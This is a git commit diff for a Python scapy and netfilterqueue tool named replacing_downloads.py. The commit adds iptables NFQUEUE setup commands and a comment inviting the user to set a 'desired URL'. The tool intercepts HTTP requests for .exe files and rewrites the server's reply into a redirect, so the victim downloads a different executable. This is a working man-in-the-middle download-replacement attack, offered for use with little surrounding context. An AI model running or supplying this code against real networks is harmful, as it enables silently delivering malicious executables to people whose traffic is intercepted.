4ac88c2c5e0ab7dc8c04649a52eeec4a2f8bc208
sarthak <sarthakkul044777@gmail.com>
2022-10-11 18:47:12 +0530

    latest

--- python/Tools/replacing_downloads.py
+++ python/Tools/replacing_downloads.py
@@ -3,6 +3,13 @@
 import netfilterqueue as nq
 import scapy.all as scapy
 
+''' 
+To run this in your local system you have to run these commands
+iptables -I INPUT -j NFQUEUE --queue-num 0
+iptables -I OUTPUT -j NFQUEUE --queue-num 0
+
+'''
+
 ack_list = []
 
 def set_load(packet, load):
@@ -12,18 +19,24 @@ def set_load(packet, load):
     del packet[scapy.TCP].chksum
     return packet
 
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
+    
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
             if ".exe" in scapy_packet[scapy.Raw].load.decode():
                 print("[+] exe Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
                 # print(scapy_packet.show())
+        
         elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+]  REplacing File")
+                
+                # Change this to your desired URL.
+
                 modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-611.exe\n\n")
                 
                 packet.set_payload((modified_packet))
